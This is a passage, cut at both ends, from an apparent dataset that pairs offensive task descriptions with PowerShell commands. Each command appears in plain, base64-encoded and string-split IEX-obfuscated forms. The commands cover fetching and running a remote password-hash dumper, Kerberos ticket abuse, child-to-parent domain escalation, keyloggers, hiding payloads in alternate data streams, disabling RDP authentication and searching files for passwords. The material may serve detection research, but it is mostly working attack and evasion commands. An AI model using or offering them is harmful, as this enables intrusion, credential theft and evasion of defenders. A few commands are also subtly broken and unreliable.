+      "IEX('ie''+''x(''+''iw''+''r(''+''\"h''+''tt''+''ps''+'':/''+''/r''+''aw''+''.g''+''it''+''hu''+''bu''+''se''+''rc''+''on''+''te''+''nt''+''.c''+''om''+''/s''+''am''+''ra''+''ta''+''sh''+''ok''+''/n''+''is''+''ha''+''ng''+''/m''+''as''+''te''+''r/''+''Ga''+''th''+''er''+''/G''+''et''+''-P''+''as''+''sH''+''as''+''he''+''s.''+''ps''+''1\"''+''))''+'';G''+''et''+''-P''+''as''+''sH''+''as''+''he''+''s')"
+    ]
+  },
+  {
+    "input": "Function Renaming for Evasion, Renames a PowerShell function to something less conspicuous, which can help in evading script analysis and monitoring tools.",
+    "outputs": [
+      "Function MyGetProc { Get-Process }; MyGetProc",
+      "powershell -enc RgB1AG4AYwB0AGkAbwBuACAATQB5AEcAZQB0AFAAcgBvAGMAIAB7ACAARwBlAHQALQBQAHIAbwBjAGUAcwBzACAAfQA7ACAATQB5AEcAZQB0AFAAcgBvAGMA",
+      "IEX('Fu''+''nc''+''ti''+''on''+'' M''+''yG''+''et''+''Pr''+''oc''+'' {''+'' G''+''et''+''-P''+''ro''+''ce''+''ss''+'' }''+''; ''+''My''+''Ge''+''tP''+''ro''+''c')"
+    ]
+  },
+  {
+    "input": "Full way impersonating the user, Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC",
+    "outputs": [
+      "Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap",
+      "powershell -enc UgB1AGIAZQB1AHMALgBlAHgAZQAgAGEAcwBrAHQAZwBzACAALwBzAGUAcgB2AGkAYwBlADoAYwBpAGYAcwAvAGQAYwAuAGQAbwBhAG0AaQBuAC4AZQB4AHQAZQByAG4AYQBsACAALwBkAG8AbQBhAGkAbgA6AGQAYwAuAGQAbwBtAGEAaQBuAC4AZQB4AHQAZQByAG4AYQBsACAALwBkAGMAOgBkAGMALgBkAG8AbQBhAGkAbgAuAGUAeAB0AGUAcgBuAGEAbAAgAC8AdABpAGMAawBlAHQAOgBkAG8ASQBGAE0AVABbAC4ALgAuAHMAbgBpAHAALgAuAC4AXQA1AEIAVABBAD0APQAgAC8AbgBvAHcAcgBhAHAA",
+      "IEX('Ru''+''be''+''us''+''.e''+''xe''+'' a''+''sk''+''tg''+''s ''+''/s''+''er''+''vi''+''ce''+'':c''+''if''+''s/''+''dc''+''.d''+''oa''+''mi''+''n.''+''ex''+''te''+''rn''+''al''+'' /''+''do''+''ma''+''in''+'':d''+''c.''+''do''+''ma''+''in''+''.e''+''xt''+''er''+''na''+''l ''+''/d''+''c:''+''dc''+''.d''+''om''+''ai''+''n.''+''ex''+''te''+''rn''+''al''+'' /''+''ti''+''ck''+''et''+'':d''+''oI''+''FM''+''T[''+''..''+''.s''+''ni''+''p.''+''..''+'']5''+''BT''+''A=''+''= ''+''/n''+''ow''+''ra''+''p')"
+    ]
+  },
+  {
+    "input": "Try to escalate privileges on an instance",
+    "outputs": [
+      "Invoke-SQLEscalatePriv -Verbose -Instance \"SQLServer1\\Instance1\"",
+      "powershell -enc SQBuAHYAbwBrAGUALQBTAFEATABFAHMAYwBhAGwAYQB0AGUAUAByAGkAdgAgAC0AVgBlAHIAYgBvAHMAZQAgAC0ASQBuAHMAdABhAG4AYwBlACAAIgBTAFEATABTAGUAcgB2AGUAcgAxAFwASQBuAHMAdABhAG4AYwBlADEAIgA=",
+      "IEX('In''+''vo''+''ke''+''-S''+''QL''+''Es''+''ca''+''la''+''te''+''Pr''+''iv''+'' -''+''Ve''+''rb''+''os''+''e ''+''-I''+''ns''+''ta''+''nc''+''e ''+''\"S''+''QL''+''Se''+''rv''+''er''+''1\\''+''In''+''st''+''an''+''ce''+''1\"')"
+    ]
+  },
+  {
+    "input": "Get GPO of an OU",
+    "outputs": [
+      "Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'",
+      "powershell -enc RwBlAHQALQBOAGUAdABHAFAATwAgAC0ARwBQAE8ATgBhAG0AZQAgACcAewAzAEUAMAA0ADEANgA3AEUALQBDADIAQgA2AC0ANABBADkAQQAtADgARgBCADcALQBDADgAMQAxADEANQA4AEQAQwA5ADcAQwB9ACcA",
+      "IEX('Ge''+''t-''+''Ne''+''tG''+''PO''+'' -''+''GP''+''ON''+''am''+''e ''+'''{''+''3E''+''04''+''16''+''7E''+''-C''+''2B''+''6-''+''4A''+''9A''+''-8''+''FB''+''7-''+''C8''+''11''+''15''+''8D''+''C9''+''7C''+''}'')"
+    ]
+  },
+  {
+    "input": "Capturing Keystrokes, Captures and logs keystrokes to a file, which can be used for gathering sensitive information like passwords.",
+    "outputs": [
+      "$path = 'C:\\temp\\keystrokes.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-Object System.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys | Out-File -FilePath $path",
+      "powershell -enc JABwAGEAdABoACAAPQAgACcAQwA6AFwAdABlAG0AcABcAGsAZQB5AHMAdAByAG8AawBlAHMALgB0AHgAdAAnADsAIABBAGQAZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsAIAAkAGwAaQBzAHQAZQBuAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4ASwBlAHkAbABvAGcAZwBlAHIAOwAgAFsAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuAF0AOgA6AFIAdQBuACgAJABsAGkAcwB0AGUAbgBlAHIAKQA7ACAAJABsAGkAcwB0AGUAbgBlAHIALgBLAGUAeQBzACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABwAGEAdABoAA==",
+      "IEX('$p''+''at''+''h ''+''= ''+'''C''+'':\\''+''te''+''mp''+''\\k''+''ey''+''st''+''ro''+''ke''+''s.''+''tx''+''t'''+''; ''+''Ad''+''d-''+''Ty''+''pe''+'' -''+''As''+''se''+''mb''+''ly''+''Na''+''me''+'' S''+''ys''+''te''+''m.''+''Wi''+''nd''+''ow''+''s.''+''Fo''+''rm''+''s;''+'' $''+''li''+''st''+''en''+''er''+'' =''+'' N''+''ew''+''-O''+''bj''+''ec''+''t ''+''Sy''+''st''+''em''+''.W''+''in''+''do''+''ws''+''.F''+''or''+''ms''+''.K''+''ey''+''lo''+''gg''+''er''+''; ''+''[S''+''ys''+''te''+''m.''+''Wi''+''nd''+''ow''+''s.''+''Fo''+''rm''+''s.''+''Ap''+''pl''+''ic''+''at''+''io''+''n]''+''::''+''Ru''+''n(''+''$l''+''is''+''te''+''ne''+''r)''+''; ''+''$l''+''is''+''te''+''ne''+''r.''+''Ke''+''ys''+'' |''+'' O''+''ut''+''-F''+''il''+''e ''+''-F''+''il''+''eP''+''at''+''h ''+''$p''+''at''+''h')"
+    ]
+  },
+  {
+    "input": "PortForwarding Since we have Local Administrator on the intermediate target bizintel: 10.35.8.17, you can add a port forwarding rule to send your requests to the final/third server secdev: 10.35.8.23.  Can quickly use netsh to rip out a one-liner and add the rule.",
+    "outputs": [
+      "netsh interface portproxy add v4tov4 listenport=5446 listenaddress=10.35.8.17 connectport=5985 connectaddress=10.35.8.23",
+      "powershell -enc bgBlAHQAcwBoACAAaQBuAHQAZQByAGYAYQBjAGUAIABwAG8AcgB0AHAAcgBvAHgAeQAgAGEAZABkACAAdgA0AHQAbwB2ADQAIABsAGkAcwB0AGUAbgBwAG8AcgB0AD0ANQA0ADQANgAgAGwAaQBzAHQAZQBuAGEAZABkAHIAZQBzAHMAPQAxADAALgAzADUALgA4AC4AMQA3ACAAYwBvAG4AbgBlAGMAdABwAG8AcgB0AD0ANQA5ADgANQAgAGMAbwBuAG4AZQBjAHQAYQBkAGQAcgBlAHMAcwA9ADEAMAAuADMANQAuADgALgAyADMA",
+      "IEX('ne''+''ts''+''h ''+''in''+''te''+''rf''+''ac''+''e ''+''po''+''rt''+''pr''+''ox''+''y ''+''ad''+''d ''+''v4''+''to''+''v4''+'' l''+''is''+''te''+''np''+''or''+''t=''+''54''+''46''+'' l''+''is''+''te''+''na''+''dd''+''re''+''ss''+''=1''+''0.''+''35''+''.8''+''.1''+''7 ''+''co''+''nn''+''ec''+''tp''+''or''+''t=''+''59''+''85''+'' c''+''on''+''ne''+''ct''+''ad''+''dr''+''es''+''s=''+''10''+''.3''+''5.''+''8.''+''23')"
+    ]
+  },
+  {
+    "input": "Find configuration files containing 'password' string, With this command we can locate files containing a certain pattern, e.g. here were are looking for a 'password' pattern in various textual configuration files:",
+    "outputs": [
+      "gci c:\\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern \"password\"",
+      "powershell -enc ZwBjAGkAIABjADoAXAAgAC0ASQBuAGMAbAB1AGQAZQAgACoALgB0AHgAdAAsACoALgB4AG0AbAAsACoALgBjAG8AbgBmAGkAZwAsACoALgBjAG8AbgBmACwAKgAuAGMAZgBnACwAKgAuAGkAbgBpACAALQBGAGkAbABlACAALQBSAGUAYwB1AHIAcwBlACAALQBFAEEAIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAAfAAgAFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAtAFAAYQB0AHQAZQByAG4AIAAiAHAAYQBzAHMAdwBvAHIAZAAiAA==",
+      "IEX('gc''+''i ''+''c:''+''\\ ''+''-I''+''nc''+''lu''+''de''+'' *''+''.t''+''xt''+'',*''+''.x''+''ml''+'',*''+''.c''+''on''+''fi''+''g,''+''*.''+''co''+''nf''+'',*''+''.c''+''fg''+'',*''+''.i''+''ni''+'' -''+''Fi''+''le''+'' -''+''Re''+''cu''+''rs''+''e ''+''-E''+''A ''+''Si''+''le''+''nt''+''ly''+''Co''+''nt''+''in''+''ue''+'' |''+'' S''+''el''+''ec''+''t-''+''St''+''ri''+''ng''+'' -''+''Pa''+''tt''+''er''+''n ''+''\"p''+''as''+''sw''+''or''+''d\"')"
+    ]
+  },
+  {
+    "input": "Search readable shares",
+    "outputs": [
+      "Find-DomainShare -CheckShareAccess",
+      "powershell -enc RgBpAG4AZAAtAEQAbwBtAGEAaQBuAFMAaABhAHIAZQAgAC0AQwBoAGUAYwBrAFMAaABhAHIAZQBBAGMAYwBlAHMAcwA=",
+      "IEX('Fi''+''nd''+''-D''+''om''+''ai''+''nS''+''ha''+''re''+'' -''+''Ch''+''ec''+''kS''+''ha''+''re''+''Ac''+''ce''+''ss')"
+    ]
+  },
+  {
+    "input": "Host discovery using mass DNS reverse lookup, Using this command we can perform quick reverse DNS lookup on the 10.10.1.0/24 subnet and see if there are any resolvable (potentially alive) hosts.The results will be then saved in the ip_hostname.txt file in the current working directory.",
+    "outputs": [
+      "$net = \"10.10.1.\";0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace(\"\\s+\",\"\").replace(\"`r\",\"\").replace(\"`n\",\" \"); Write-Output \"$net$_ $r\"} | tee ip_hostname.txt",
+      "powershell -enc JABuAGUAdAAgAD0AIAAiADEAMAAuADEAMAAuADEALgAiADsAMAAuAC4AMgA1ADUAIAB8ACAAZgBvAHIAZQBhAGMAaAAgAHsAJAByAD0AKABSAGUAcwBvAGwAdgBlAC0ARABOAFMAbgBhAG0AZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAgACQAbgBlAHQAJABfACAAfAAgAGYAdAAgAE4AYQBtAGUASABvAHMAdAAgAC0ASABpAGQAZQBUAGEAYgBsAGUASABlAGEAZABlAHIAcwAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkALgB0AHIAaQBtACgAKQAuAHIAZQBwAGwAYQBjAGUAKAAiAFwAcwArACIALAAiACIAKQAuAHIAZQBwAGwAYQBjAGUAKAAiAGAAcgAiACwAIgAiACkALgByAGUAcABsAGEAYwBlACgAIgBgAG4AIgAsACIAIAAiACkAOwAgAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAIgAkAG4AZQB0ACQAXwAgACQAcgAiAH0AIAB8ACAAdABlAGUAIABpAHAAXwBoAG8AcwB0AG4AYQBtAGUALgB0AHgAdAA=",
+      "IEX('$n''+''et''+'' =''+'' \"''+''10''+''.1''+''0.''+''1.''+''\";''+''0.''+''.2''+''55''+'' |''+'' f''+''or''+''ea''+''ch''+'' {''+''$r''+''=(''+''Re''+''so''+''lv''+''e-''+''DN''+''Sn''+''am''+''e ''+''-E''+''rr''+''or''+''Ac''+''ti''+''on''+'' S''+''il''+''en''+''tl''+''yC''+''on''+''ti''+''nu''+''e ''+''$n''+''et''+''$_''+'' |''+'' f''+''t ''+''Na''+''me''+''Ho''+''st''+'' -''+''Hi''+''de''+''Ta''+''bl''+''eH''+''ea''+''de''+''rs''+'' |''+'' O''+''ut''+''-S''+''tr''+''in''+''g)''+''.t''+''ri''+''m(''+'').''+''re''+''pl''+''ac''+''e(''+''\"\\''+''s+''+''\",''+''\"\"''+'').''+''re''+''pl''+''ac''+''e(''+''\"`''+''r\"''+'',\"''+''\")''+''.r''+''ep''+''la''+''ce''+''(\"''+''`n''+''\",''+''\" ''+''\")''+''; ''+''Wr''+''it''+''e-''+''Ou''+''tp''+''ut''+'' \"''+''$n''+''et''+''$_''+'' $''+''r\"''+''} ''+''| ''+''te''+''e ''+''ip''+''_h''+''os''+''tn''+''am''+''e.''+''tx''+''t')"
+    ]
+  },
+  {
+    "input": "Automatic using raiseChild.py This is an Impacket script which will automate escalating from child to parent domain. The script needs:   Target domain controller  Creds for an admin user in the child domain  The flow is:   Obtains the SID for the Enterprise Admins group of the parent domain  Retrieves the hash for the KRBTGT account in the child domain  Creates a Golden Ticket  Logs into the parent domain  Retrieves credentials for the Administrator account in the parent domain  If the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.",
+    "outputs": [
+      "raiseChild.py -target-exec 10.10.10.10 <child_domain>/username",
+      "powershell -enc cgBhAGkAcwBlAEMAaABpAGwAZAAuAHAAeQAgAC0AdABhAHIAZwBlAHQALQBlAHgAZQBjACAAMQAwAC4AMQAwAC4AMQAwAC4AMQAwACAAPABjAGgAaQBsAGQAXwBkAG8AbQBhAGkAbgA+AC8AdQBzAGUAcgBuAGEAbQBlAA==",
+      "IEX('ra''+''is''+''eC''+''hi''+''ld''+''.p''+''y ''+''-t''+''ar''+''ge''+''t-''+''ex''+''ec''+'' 1''+''0.''+''10''+''.1''+''0.''+''10''+'' <''+''ch''+''il''+''d_''+''do''+''ma''+''in''+''>/''+''us''+''er''+''na''+''me')"
+    ]
+  },
+  {
+    "input": "Create a guest SMB shared drive, Here's a cool trick to quickly start a SMB (CIFS) network shared drive accessible by anyone:",
+    "outputs": [
+      "new-item \"c:\\users\\public\\share\" -itemtype directory;New-SmbShare -Name \"sharedir\" -Path \"C:\\users\\public\\share\" -FullAccess \"Everyone\",\"Guests\",\"Anonymous Logon\"",
+      "powershell -enc bgBlAHcALQBpAHQAZQBtACAAIgBjADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAHMAaABhAHIAZQAiACAALQBpAHQAZQBtAHQAeQBwAGUAIABkAGkAcgBlAGMAdABvAHIAeQA7AE4AZQB3AC0AUwBtAGIAUwBoAGEAcgBlACAALQBOAGEAbQBlACAAIgBzAGgAYQByAGUAZABpAHIAIgAgAC0AUABhAHQAaAAgACIAQwA6AFwAdQBzAGUAcgBzAFwAcAB1AGIAbABpAGMAXABzAGgAYQByAGUAIgAgAC0ARgB1AGwAbABBAGMAYwBlAHMAcwAgACIARQB2AGUAcgB5AG8AbgBlACIALAAiAEcAdQBlAHMAdABzACIALAAiAEEAbgBvAG4AeQBtAG8AdQBzACAATABvAGcAbwBuACIA",
+      "IEX('ne''+''w-''+''it''+''em''+'' \"''+''c:''+''\\u''+''se''+''rs''+''\\p''+''ub''+''li''+''c\\''+''sh''+''ar''+''e\"''+'' -''+''it''+''em''+''ty''+''pe''+'' d''+''ir''+''ec''+''to''+''ry''+'';N''+''ew''+''-S''+''mb''+''Sh''+''ar''+''e ''+''-N''+''am''+''e ''+''\"s''+''ha''+''re''+''di''+''r\"''+'' -''+''Pa''+''th''+'' \"''+''C:''+''\\u''+''se''+''rs''+''\\p''+''ub''+''li''+''c\\''+''sh''+''ar''+''e\"''+'' -''+''Fu''+''ll''+''Ac''+''ce''+''ss''+'' \"''+''Ev''+''er''+''yo''+''ne''+''\",''+''\"G''+''ue''+''st''+''s\"''+'',\"''+''An''+''on''+''ym''+''ou''+''s ''+''Lo''+''go''+''n\"')"
+    ]
+  },
+  {
+    "input": "Using Alternate Data Streams for Evasion, Hides malicious commands or data in alternate data streams of files, which is a method often used to evade detection.",
+    "outputs": [
+      "$content = 'Invoke-Mimikatz'; $file = 'C:\\temp\\normal.txt'; $stream = 'C:\\temp\\normal.txt:hidden'; SetContent -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; GetContent -Path $stream",
+      "powershell -enc JABjAG8AbgB0AGUAbgB0ACAAPQAgACcASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAJwA7ACAAJABmAGkAbABlACAAPQAgACcAQwA6AFwAdABlAG0AcABcAG4AbwByAG0AYQBsAC4AdAB4AHQAJwA7ACAAJABzAHQAcgBlAGEAbQAgAD0AIAAnAEMAOgBcAHQAZQBtAHAAXABuAG8AcgBtAGEAbAAuAHQAeAB0ADoAaABpAGQAZABlAG4AJwA7ACAAUwBlAHQAQwBvAG4AdABlAG4AdAAgAC0AUABhAHQAaAAgACQAZgBpAGwAZQAgAC0AVgBhAGwAdQBlACAAJwBUAGgAaQBzACAAaQBzACAAYQAgAG4AbwByAG0AYQBsACAAZgBpAGwAZQAnADsAIABBAGQAZAAtAEMAbwBuAHQAZQBuAHQAIAAtAFAAYQB0AGgAIAAkAHMAdAByAGUAYQBtACAALQBWAGEAbAB1AGUAIAAkAGMAbwBuAHQAZQBuAHQAOwAgAEcAZQB0AEMAbwBuAHQAZQBuAHQAIAAtAFAAYQB0AGgAIAAkAHMAdAByAGUAYQBtAA==",
+      "IEX('$c''+''on''+''te''+''nt''+'' =''+'' '''+''In''+''vo''+''ke''+''-M''+''im''+''ik''+''at''+''z'''+''; ''+''$f''+''il''+''e ''+''= ''+'''C''+'':\\''+''te''+''mp''+''\\n''+''or''+''ma''+''l.''+''tx''+''t'''+''; ''+''$s''+''tr''+''ea''+''m ''+''= ''+'''C''+'':\\''+''te''+''mp''+''\\n''+''or''+''ma''+''l.''+''tx''+''t:''+''hi''+''dd''+''en''+''';''+'' S''+''et''+''Co''+''nt''+''en''+''t ''+''-P''+''at''+''h ''+''$f''+''il''+''e ''+''-V''+''al''+''ue''+'' '''+''Th''+''is''+'' i''+''s ''+''a ''+''no''+''rm''+''al''+'' f''+''il''+''e'''+''; ''+''Ad''+''d-''+''Co''+''nt''+''en''+''t ''+''-P''+''at''+''h ''+''$s''+''tr''+''ea''+''m ''+''-V''+''al''+''ue''+'' $''+''co''+''nt''+''en''+''t;''+'' G''+''et''+''Co''+''nt''+''en''+''t ''+''-P''+''at''+''h ''+''$s''+''tr''+''ea''+''m')"
+    ]
+  },
+  {
+    "input": "Get SID of the current user, The following command will return SID value of the current user, Check if we are running with elevated (admin) privileges:",
+    "outputs": [
+      "([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value",
+      "powershell -enc KABbAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEkAZABlAG4AdABpAHQAeQBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0ACgAKQApAC4AVQBzAGUAcgAuAFYAYQBsAHUAZQA=",
+      "IEX('([''+''Sy''+''st''+''em''+''.S''+''ec''+''ur''+''it''+''y.''+''Pr''+''in''+''ci''+''pa''+''l.''+''Wi''+''nd''+''ow''+''sI''+''de''+''nt''+''it''+''y]''+''::''+''Ge''+''tC''+''ur''+''re''+''nt''+''()''+'').''+''Us''+''er''+''.V''+''al''+''ue')"
+    ]
+  },
+  {
+    "input": "File Path Obfuscation, Obfuscates a file path using Base64 encoding, making it harder to detect malicious file paths or commands.",
+    "outputs": [
+      "$path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcFxBZG1pblRvb2xz')); Invoke-Item $path",
+      "powershell -enc JABwAGEAdABoACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAFEAegBwAGMAVgBHAFYAdABjAEYAeABCAFoARwAxAHAAYgBsAFIAdgBiADIAeAB6ACcAKQApADsAIABJAG4AdgBvAGsAZQAtAEkAdABlAG0AIAAkAHAAYQB0AGgA",
+      "IEX('$p''+''at''+''h ''+''= ''+''[S''+''ys''+''te''+''m.''+''Te''+''xt''+''.E''+''nc''+''od''+''in''+''g]''+''::''+''UT''+''F8''+''.G''+''et''+''St''+''ri''+''ng''+''([''+''Sy''+''st''+''em''+''.C''+''on''+''ve''+''rt''+'']:''+'':F''+''ro''+''mB''+''as''+''e6''+''4S''+''tr''+''in''+''g(''+'''Q''+''zp''+''cV''+''GV''+''tc''+''Fx''+''BZ''+''G1''+''pb''+''lR''+''vb''+''2x''+''z'''+''))''+''; ''+''In''+''vo''+''ke''+''-I''+''te''+''m ''+''$p''+''at''+''h')"
+    ]
+  },
+  {
+    "input": "In-Memory Script Execution, Executes a PowerShell script entirely in memory without writing to disk, helping to evade file-based detection mechanisms.",
+    "outputs": [
+      "$code = [System.IO.File]::ReadAllText('C:\\temp\\script.ps1'); Invoke-Expression $code",
+      "powershell -enc JABjAG8AZABlACAAPQAgAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAVABlAHgAdAAoACcAQwA6AFwAdABlAG0AcABcAHMAYwByAGkAcAB0AC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAGMAbwBkAGUA",
+      "IEX('$c''+''od''+''e ''+''= ''+''[S''+''ys''+''te''+''m.''+''IO''+''.F''+''il''+''e]''+''::''+''Re''+''ad''+''Al''+''lT''+''ex''+''t(''+'''C''+'':\\''+''te''+''mp''+''\\s''+''cr''+''ip''+''t.''+''ps''+''1'''+'');''+'' I''+''nv''+''ok''+''e-''+''Ex''+''pr''+''es''+''si''+''on''+'' $''+''co''+''de')"
+    ]
+  },
+  {
+    "input": "Allow Remote Desktop connections, Disable NLA",
+    "outputs": [
+      "(Get-WmiObject -class \"Win32_TSGeneralSetting\" -Namespace root\\cimv2\\terminalservices -Filter \"TerminalName='RDP-tcp'\").SetUserAuthenticationRequired(0)",
+      "powershell -enc KABHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAALQBjAGwAYQBzAHMAIAAiAFcAaQBuADMAMgBfAFQAUwBHAGUAbgBlAHIAYQBsAFMAZQB0AHQAaQBuAGcAIgAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIAByAG8AbwB0AFwAYwBpAG0AdgAyAFwAdABlAHIAbQBpAG4AYQBsAHMAZQByAHYAaQBjAGUAcwAgAC0ARgBpAGwAdABlAHIAIAAiAFQAZQByAG0AaQBuAGEAbABOAGEAbQBlAD0AJwBSAEQAUAAtAHQAYwBwACcAIgApAC4AUwBlAHQAVQBzAGUAcgBBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUgBlAHEAdQBpAHIAZQBkACgAMAApAA==",
+      "IEX('(G''+''et''+''-W''+''mi''+''Ob''+''je''+''ct''+'' -''+''cl''+''as''+''s ''+''\"W''+''in''+''32''+''_T''+''SG''+''en''+''er''+''al''+''Se''+''tt''+''in''+''g\"''+'' -''+''Na''+''me''+''sp''+''ac''+''e ''+''ro''+''ot''+''\\c''+''im''+''v2''+''\\t''+''er''+''mi''+''na''+''ls''+''er''+''vi''+''ce''+''s ''+''-F''+''il''+''te''+''r ''+''\"T''+''er''+''mi''+''na''+''lN''+''am''+''e=''+'''R''+''DP''+''-t''+''cp''+'''\"''+'').''+''Se''+''tU''+''se''+''rA''+''ut''+''he''+''nt''+''ic''+''at''+''io''+''nR''+''eq''+''ui''+''re''+''d(''+''0)')"
+    ]
+  },
+  {
+    "input": "Get info of current forest (no external)",
+    "outputs": [
+      "Get-ForestGlobalCatalog",
+      "powershell -enc RwBlAHQALQBGAG8AcgBlAHMAdABHAGwAbwBiAGEAbABDAGEAdABhAGwAbwBnAA==",
+      "IEX('Ge''+''t-''+''Fo''+''re''+''st''+''Gl''+''ob''+''al''+''Ca''+''ta''+''lo''+''g')"
+    ]
+  },
+  {
+    "input": "Invoke Windows API for Keylogging, This script uses a Windows API call to check the state of each key on the keyboard, effectively logging keystrokes. It can be used to capture user input.",
+    "outputs": [
+      "Add-Type -TypeDefinition @\" using System; using System.Runtime.InteropServices; public class KeyLogger { [DllImport(\"user32.dll\")] public static extern int GetAsyncKeyState(Int32 i); } \"@ while ($true) { Start-Sleep -Milliseconds 100 for ($i = 8; $i -le 190; $i++) { if ([KeyLogger]::GetAsyncKeyState($i) eq -32767) { $Key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i) Write-Host $Key } } }",
+      "powershell -enc QQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIABAACIAIAB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7ACAAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAASwBlAHkATABvAGcAZwBlAHIAIAB7ACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAdQBzAGUAcgAzADIALgBkAGwAbAAiACkAXQAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGkAbgB0ACAARwBlAHQAQQBzAHkAbgBjAEsAZQB5AFMAdABhAHQAZQAoAEkAbgB0ADMAMgAgAGkAKQA7ACAAfQAgACIAQAAgAHcAaABpAGwAZQAgACgAJAB0AHIAdQBlACkAIAB7ACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBNAGkAbABsAGkAcwBlAGMAbwBuAGQAcwAgADEAMAAwACAAZgBvAHIAIAAoACQAaQAgAD0AIAA4ADsAIAAkAGkAIAAtAGwAZQAgADEAOQAwADsAIAAkAGkAKwArACkAIAB7ACAAaQBmACAAKABbAEsAZQB5AEwAbwBnAGcAZQByAF0AOgA6AEcAZQB0AEEAcwB5AG4AYwBLAGUAeQBTAHQAYQB0AGUAKAAkAGkAKQAgAGUAcQAgAC0AMwAyADcANgA3ACkAIAB7ACAAJABLAGUAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4ARQBuAHUAbQBdADoAOgBHAGUAdABOAGEAbQBlACgAWwBTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMALgBLAGUAeQBzAF0ALAAgACQAaQApACAAVwByAGkAdABlAC0ASABvAHMAdAAgACQASwBlAHkAIAB9ACAAfQAgAH0A",
+      "IEX('Ad''+''d-''+''Ty''+''pe''+'' -''+''Ty''+''pe''+''De''+''fi''+''ni''+''ti''+''on''+'' @''+''\" ''+''us''+''in''+''g ''+''Sy''+''st''+''em''+''; ''+''us''+''in''+''g ''+''Sy''+''st''+''em''+''.R''+''un''+''ti''+''me''+''.I''+''nt''+''er''+''op''+''Se''+''rv''+''ic''+''es''+''; ''+''pu''+''bl''+''ic''+'' c''+''la''+''ss''+'' K''+''ey''+''Lo''+''gg''+''er''+'' {''+'' [''+''Dl''+''lI''+''mp''+''or''+''t(''+''\"u''+''se''+''r3''+''2.''+''dl''+''l\"''+'')]''+'' p''+''ub''+''li''+''c ''+''st''+''at''+''ic''+'' e''+''xt''+''er''+''n ''+''in''+''t ''+''Ge''+''tA''+''sy''+''nc''+''Ke''+''yS''+''ta''+''te''+''(I''+''nt''+''32''+'' i''+'');''+'' }''+'' \"''+''@ ''+''wh''+''il''+''e ''+''($''+''tr''+''ue''+'') ''+''{ ''+''St''+''ar''+''t-''+''Sl''+''ee''+''p ''+''-M''+''il''+''li''+''se''+''co''+''nd''+''s ''+''10''+''0 ''+''fo''+''r ''+''($''+''i ''+''= ''+''8;''+'' $''+''i ''+''-l''+''e ''+''19''+''0;''+'' $''+''i+''+''+)''+'' {''+'' i''+''f ''+''([''+''Ke''+''yL''+''og''+''ge''+''r]''+''::''+''Ge''+''tA''+''sy''+''nc''+''Ke''+''yS''+''ta''+''te''+''($''+''i)''+'' e''+''q ''+''-3''+''27''+''67''+'') ''+''{ ''+''$K''+''ey''+'' =''+'' 